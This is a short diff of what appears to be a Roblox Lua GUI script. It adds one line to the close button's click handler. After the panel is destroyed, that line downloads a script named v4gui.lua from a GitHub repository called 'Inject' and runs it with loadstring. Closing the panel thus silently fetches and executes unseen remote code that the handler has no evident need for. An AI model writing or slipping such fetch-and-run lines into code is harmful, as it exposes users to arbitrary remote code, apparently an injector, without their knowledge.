@@ -36,6 +36,7 @@ closeBtn.Parent = panel
 
 closeBtn.MouseButton1Click:Connect(function()
     gui:Destroy()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/InfinitiveDev/Inject/refs/heads/main/v4gui.lua"))()
 end)
 
 -- 🔗 Fetch message from GitHub
